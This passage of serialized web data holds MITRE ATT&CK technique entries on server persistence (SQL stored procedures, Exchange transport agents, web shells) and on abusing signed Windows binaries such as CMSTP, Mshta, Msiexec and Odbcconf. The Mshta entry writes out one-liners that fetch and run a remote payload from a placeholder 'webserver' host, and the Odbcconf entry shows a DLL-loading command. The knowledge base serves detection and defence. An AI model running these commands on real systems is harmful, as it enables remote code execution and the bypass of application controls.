href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsql\u002Frelational-databases\u002Fsystem-stored-procedures\u002Fxp-cmdshell-transact-sql?view=sql-server-2017'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsql\u002Frelational-databases\u002Fclr-integration\u002Fcommon-language-runtime-integration-overview?view=sql-server-2017'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.netspi.com\u002Fattacking-sql-server-clr-assemblies\u002F'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";DB.external_references=[{source_name:b,external_id:DC,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1505\u002F001"},{source_name:"NetSPI Startup Stored Procedures",url:"https:\u002F\u002Fblog.netspi.com\u002Fsql-server-persistence-part-1-startup-stored-procedures\u002F",description:"Sutherland, S. (2016, March 7). Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures. Retrieved July 8, 2019."},{source_name:"Kaspersky MSSQL Aug 2019",url:"https:\u002F\u002Fsecurelist.com\u002Fmalicious-tasks-in-ms-sql-server\u002F92167\u002F",description:"Plakhov, A., Sitchikhin, D. (2019, August 22). Agent 1433: remote attack on Microsoft SQL Server. Retrieved September 4, 2019."},{source_name:"Microsoft xp_cmdshell 2017",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsql\u002Frelational-databases\u002Fsystem-stored-procedures\u002Fxp-cmdshell-transact-sql?view=sql-server-2017",description:"Microsoft. (2017, March 15). xp_cmdshell (Transact-SQL). Retrieved September 9, 2019."},{source_name:"Microsoft CLR Integration 2017",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsql\u002Frelational-databases\u002Fclr-integration\u002Fcommon-language-runtime-integration-overview?view=sql-server-2017",description:"Microsoft. (2017, June 19). Common Language Runtime Integration. Retrieved July 8, 2019."},{source_name:"NetSPI SQL Server CLR",url:"https:\u002F\u002Fblog.netspi.com\u002Fattacking-sql-server-clr-assemblies\u002F",description:"Sutherland, S. (2017, July 13). Attacking SQL Server CLR Assemblies. Retrieved July 8, 2019."}];DB["subtechnique-of"]=bT;DD.id=DE;DD["object-type"]=a;DD.name="Transport Agent";DD.description="Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fexchange\u002Ftransport-agents-exchange-2013-help'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2019\u002F05\u002FESET-LightNeuron.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. \n\nAdversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2019\u002F05\u002FESET-LightNeuron.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ";DD.external_references=[{source_name:b,external_id:DE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1505\u002F002"},{source_name:"Microsoft TransportAgent Jun 2016",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fexchange\u002Ftransport-agents-exchange-2013-help",description:"Microsoft. (2016, June 1). Transport agents. Retrieved June 24, 2019."},{source_name:"ESET LightNeuron May 2019",url:"https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2019\u002F05\u002FESET-LightNeuron.pdf",description:"Faou, M. (2019, May). Turla LightNeuron: One email away from remote code execution. Retrieved June 24, 2019."}];DD["subtechnique-of"]=bT;DF.id=DG;DF["object-type"]=a;DF.name="Web Shell";DF.description="Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0020'\u003EChina Chopper\u003C\u002Fa\u003E Web shell client).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2013\u002F08\u002Fbreaking-down-the-china-chopper-web-shell-part-i.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E ";DF.external_references=[{source_name:b,external_id:DG,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1505\u002F003"},{external_id:"CAPEC-650",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F650.html"},{source_name:"Lee 2013",description:"Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down the China Chopper Web Shell - Part I. Retrieved March 27, 2015.",url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2013\u002F08\u002Fbreaking-down-the-china-chopper-web-shell-part-i.html"},{url:Dy,description:Dz,source_name:DA}];DF["subtechnique-of"]=bT;DK.id=DL;DK["object-type"]=a;DK.name="CMSTP";DK.description="Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2003\u002Fcc786431(v=ws.10)'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\n\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftwitter.com\u002FItsReallyNick\u002Fstatus\u002F958789644165894146'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F010'\u003ERegsvr32\u003C\u002Fa\u003E \u002F ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsitpros.com\u002F?p=3960'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E  and\u002For COM scriptlets (SCT) from remote servers. \u003Csup\u003E\u003Ca href='https:\u002F\u002Ftwitter.com\u002FNickTyrer\u002Fstatus\u002F958450014111633408'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fapi0cradle\u002FUltimateAppLockerByPassList'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.endurant.io\u002Fcmstp\u002Fdetecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.\n\nCMSTP.exe can also be abused to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1548\u002F002'\u003EBypass User Account Control\u003C\u002Fa\u003E and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsitpros.com\u002F?p=3960'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fapi0cradle\u002FUltimateAppLockerByPassList'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.endurant.io\u002Fcmstp\u002Fdetecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon\u002F'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";DK.external_references=[{source_name:b,external_id:DL,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F003"},{url:"https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2003\u002Fcc786431(v=ws.10)",description:"Microsoft. (2009, October 8). How Connection Manager Works. Retrieved April 11, 2018.",source_name:"Microsoft Connection Manager Oct 2009"},{url:"https:\u002F\u002Ftwitter.com\u002FItsReallyNick\u002Fstatus\u002F958789644165894146",description:"Carr, N. (2018, January 31). Here is some early bad cmstp.exe... Retrieved April 11, 2018.",source_name:"Twitter CMSTP Usage Jan 2018"},{url:"https:\u002F\u002Fmsitpros.com\u002F?p=3960",description:"Moe, O. (2017, August 15). Research on CMSTP.exe. Retrieved April 11, 2018.",source_name:"MSitPros CMSTP Aug 2017"},{url:"https:\u002F\u002Ftwitter.com\u002FNickTyrer\u002Fstatus\u002F958450014111633408",description:"Tyrer, N. (2018, January 30). CMSTP.exe - remote .sct execution applocker bypass. Retrieved April 11, 2018.",source_name:"Twitter CMSTP Jan 2018"},{url:DM,description:DN,source_name:DO},{url:"http:\u002F\u002Fwww.endurant.io\u002Fcmstp\u002Fdetecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon\u002F",description:"Seetharaman, N. (2018, July 7). Detecting CMSTP-Enabled Code Execution and UAC Bypass With Sysmon.. Retrieved August 6, 2018.",source_name:"Endurant CMSTP July 2018"}];DK["subtechnique-of"]=H;DP.id=DQ;DP["object-type"]=a;DP.name="Compiled HTML File";DP.description="Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting\u002Fweb related programming languages such VBA, JScript, Java, and ActiveX. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002Fwindows\u002Fdesktop\u002Fhtmlhelp\u002Fmicrosoft-html-help-1-4-sdk'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E CHM content is displayed using underlying components of the Internet Explorer browser \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fwindows\u002Fdesktop\u002Fms644670'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E loaded by the HTML Help executable program (hh.exe). \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fwindows\u002Fdesktop\u002Fms524405'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204'\u003EUser Execution\u003C\u002Fa\u003E. CHM execution may also bypass application application control on older and\u002For unpatched systems that do not account for execution of binaries through hh.exe. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsitpros.com\u002F?p=3909'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fportal.msrc.microsoft.com\u002Fen-US\u002Fsecurity-guidance\u002Fadvisory\u002FCVE-2017-8625'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";DP.external_references=[{source_name:b,external_id:DQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F001"},{source_name:"Microsoft HTML Help May 2018",description:"Microsoft. (2018, May 30). Microsoft HTML Help 1.4. Retrieved October 3, 2018.",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fprevious-versions\u002Fwindows\u002Fdesktop\u002Fhtmlhelp\u002Fmicrosoft-html-help-1-4-sdk"},{source_name:"Microsoft HTML Help ActiveX",description:"Microsoft. (n.d.). HTML Help ActiveX Control Overview. Retrieved October 3, 2018.",url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fwindows\u002Fdesktop\u002Fms644670"},{source_name:"Microsoft HTML Help Executable Program",description:"Microsoft. (n.d.). About the HTML Help Executable Program. Retrieved October 3, 2018.",url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fwindows\u002Fdesktop\u002Fms524405"},{source_name:"MsitPros CHM Aug 2017",description:"Moe, O. (2017, August 13). Bypassing Device guard UMCI using CHM – CVE-2017-8625. Retrieved October 3, 2018.",url:"https:\u002F\u002Fmsitpros.com\u002F?p=3909"},{source_name:"Microsoft CVE-2017-8625 Aug 2017",description:"Microsoft. (2017, August 8). CVE-2017-8625 - Internet Explorer Security Feature Bypass Vulnerability. Retrieved October 3, 2018.",url:"https:\u002F\u002Fportal.msrc.microsoft.com\u002Fen-US\u002Fsecurity-guidance\u002Fadvisory\u002FCVE-2017-8625"}];DP["subtechnique-of"]=H;DR.id=DS;DR["object-type"]=a;DR.name="Control Panel";DR.description="Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\n\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a \u003Ccode\u003ECPlApplet\u003C\u002Fcode\u003E function.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fcc144185.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.de\u002Fcloud-content\u002Fus\u002Fpdfs\u002Fsecurity-intelligence\u002Fwhite-papers\u002Fwp-cpl-malware.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fcc144185.aspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fcc144185.aspx'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.de\u002Fcloud-content\u002Fus\u002Fpdfs\u002Fsecurity-intelligence\u002Fwhite-papers\u002Fwp-cpl-malware.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fcontrol-panel-files-used-as-malicious-attachments\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nMalicious Control Panel items can be delivered via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E campaigns\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.de\u002Fcloud-content\u002Fus\u002Fpdfs\u002Fsecurity-intelligence\u002Fwhite-papers\u002Fwp-cpl-malware.pdf'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fcontrol-panel-files-used-as-malicious-attachments\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or executed as part of multi-stage malware.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2017\u002F11\u002Funit42-new-malware-with-ties-to-sunorcal-discovered\u002F'\u003E[9]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Control Panel items, specifically CPL files, may also bypass application and\u002For file extension allow lists.\n\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to \u003Ccode\u003EHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls\u003C\u002Fcode\u003E. Even when these registered DLLs do not comply with the CPL file specification and do not export \u003Ccode\u003ECPlApplet\u003C\u002Fcode\u003E functions, they are loaded and executed through its \u003Ccode\u003EDllEntryPoint\u003C\u002Fcode\u003E when Control Panel is executed. CPL files not exporting \u003Ccode\u003ECPlApplet\u003C\u002Fcode\u003E are not directly executable.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2020\u002F06\u002FESET_InvisiMole.pdf'\u003E[10]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";DR.external_references=[{source_name:b,external_id:DS,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F002"},{source_name:"Microsoft Implementing CPL",description:"M. (n.d.). Implementing Control Panel Items. Retrieved January 18, 2018.",url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fwindows\u002Fdesktop\u002Fcc144185.aspx"},{url:DT,description:"Mercês, F. (2014, January 27). CPL Malware - Malicious Control Panel Items. Retrieved January 18, 2018.",source_name:"TrendMicro CPL Malware Jan 2014"},{url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fcontrol-panel-files-used-as-malicious-attachments\u002F",description:"Bernardino, J. (2013, December 17). Control Panel Files Used As Malicious Attachments. Retrieved January 18, 2018.",source_name:"TrendMicro CPL Malware Dec 2013"},{url:"https:\u002F\u002Fresearchcenter.paloaltonetworks.com\u002F2017\u002F11\u002Funit42-new-malware-with-ties-to-sunorcal-discovered\u002F",description:"Grunzweig, J. and Miller-Osborn, J. (2017, November 10). New Malware with Ties to SunOrcal Discovered. Retrieved November 16, 2017.",source_name:"Palo Alto Reaver Nov 2017"},{source_name:sR,url:sS,description:sT}];DR["subtechnique-of"]=H;DU.id=DV;DU["object-type"]=a;DU.name="InstallUtil";DU.description="Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002F50614e95.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: \u003Ccode\u003EC:\\Windows\\Microsoft.NET\\Framework\\v\u003Cversion\u003E\\InstallUtil.exe\u003C\u002Fcode\u003E and \u003Ccode\u003EC:\\Windows\\Microsoft.NET\\Framework64\\v\u003Cversion\u003E\\InstallUtil.exe\u003C\u002Fcode\u003E.\n\nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute \u003Ccode\u003E[System.ComponentModel.RunInstaller(true)]\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FInstallutil\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";DU.external_references=[{source_name:b,external_id:DV,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F004"},{source_name:"MSDN InstallUtil",description:"Microsoft. (n.d.). Installutil.exe (Installer Tool). Retrieved July 1, 2016.",url:"https:\u002F\u002Fmsdn.microsoft.com\u002Fen-us\u002Flibrary\u002F50614e95.aspx"},{source_name:"LOLBAS Installutil",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FInstallutil\u002F",description:"LOLBAS. (n.d.). Installutil.exe. Retrieved July 31, 2019."}];DU["subtechnique-of"]=H;DW.id=DX;DW["object-type"]=a;DW.name="Mshta";DW.description="Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cylance.com\u002Fcontent\u002Fdam\u002Fcylance\u002Fpdfs\u002Freports\u002FOp_Dust_Storm_Report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.redcanary.com\u002Fblog\u002Fmicrosoft-html-application-hta-abuse-part-deux\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F04\u002Fcve-2017-0199-hta-handler.html'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fairbus-cyber-security.com\u002Ffileless-malware-behavioural-analysis-kovter-persistence\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F04\u002Ffin7-phishing-lnk.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FHTML_Application'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms536471.aspx'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nFiles may be executed by mshta.exe through an inline script: \u003Ccode\u003Emshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]\u002F\u002Fwebserver\u002Fpayload[.]sct\"\")\"))\u003C\u002Fcode\u003E\n\nThey may also be executed directly from URLs: \u003Ccode\u003Emshta http[:]\u002F\u002Fwebserver\u002Fpayload[.]hta\u003C\u002Fcode\u003E\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. \u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FMshta\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";DW.external_references=[{source_name:b,external_id:DX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F005"},{source_name:"Cylance Dust Storm",description:"Gross, J. (2016, February 23). Operation Dust Storm. Retrieved September 19, 2017.",url:"https:\u002F\u002Fwww.cylance.com\u002Fcontent\u002Fdam\u002Fcylance\u002Fpdfs\u002Freports\u002FOp_Dust_Storm_Report.pdf"},{source_name:"Red Canary HTA Abuse Part Deux",description:"McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.",url:"https:\u002F\u002Fwww.redcanary.com\u002Fblog\u002Fmicrosoft-html-application-hta-abuse-part-deux\u002F"},{url:"https:\u002F\u002Fwww.fireeye.com\u002Fblog\u002Fthreat-research\u002F2017\u002F04\u002Fcve-2017-0199-hta-handler.html",description:"Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.",source_name:"FireEye Attacks Leveraging HTA"},{description:"Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.",source_name:"Airbus Security Kovter Analysis",url:"https:\u002F\u002Fairbus-cyber-security.com\u002Ffileless-malware-behavioural-analysis-kovter-persistence\u002F"},{url:DY,description:DZ,source_name:D_},{source_name:"Wikipedia HTML Application",description:"Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.",url:"https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FHTML_Application"},{source_name:"MSDN HTML Applications",description:"Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.",url:"https:\u002F\u002Fmsdn.microsoft.com\u002Flibrary\u002Fms536471.aspx"},{source_name:"LOLBAS Mshta",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FMshta\u002F",description:"LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019."}];DW["subtechnique-of"]=H;D$.id=Ea;D$["object-type"]=a;D$.name="Msiexec";D$.description="Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fadministration\u002Fwindows-commands\u002Fmsiexec'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Msiexec.exe is digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.\u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FMsiexec\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fattack-using-windows-installer-msiexec-exe-leads-lokibot\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the \u003Ccode\u003EAlwaysInstallElevated\u003C\u002Fcode\u003E policy is enabled.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fmsi\u002Falwaysinstallelevated'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";D$.external_references=[{source_name:b,external_id:Ea,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F007"},{source_name:"Microsoft msiexec",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows-server\u002Fadministration\u002Fwindows-commands\u002Fmsiexec",description:"Microsoft. (2017, October 15). msiexec. Retrieved January 24, 2020."},{description:"LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.",url:"https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FMsiexec\u002F",source_name:"LOLBAS Msiexec"},{source_name:"TrendMicro Msiexec Feb 2018",url:"https:\u002F\u002Fblog.trendmicro.com\u002Ftrendlabs-security-intelligence\u002Fattack-using-windows-installer-msiexec-exe-leads-lokibot\u002F",description:"Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019."},{source_name:"Microsoft AlwaysInstallElevated 2018",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fwin32\u002Fmsi\u002Falwaysinstallelevated",description:"Microsoft. (2018, May 31). AlwaysInstallElevated. Retrieved December 14, 2020."}];D$["subtechnique-of"]=H;Eb.id=Ec;Eb["object-type"]=a;Eb.name="Odbcconf";Eb.description="Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsql\u002Fodbc\u002Fodbcconf-exe?view=sql-server-2017'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Odbcconf.exe is digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1218\u002F010'\u003ERegsvr32\u003C\u002Fa\u003E, odbcconf.exe has a \u003Ccode\u003EREGSVR\u003C\u002Fcode\u003E flag that can be misused to execute DLLs (ex: \u003Ccode\u003Eodbcconf.exe \u002FS \u002FA &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;\u003C\u002Fcode\u003E). \u003Csup\u003E\u003Ca href='https:\u002F\u002Flolbas-project.github.io\u002Flolbas\u002FBinaries\u002FOdbcconf\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca 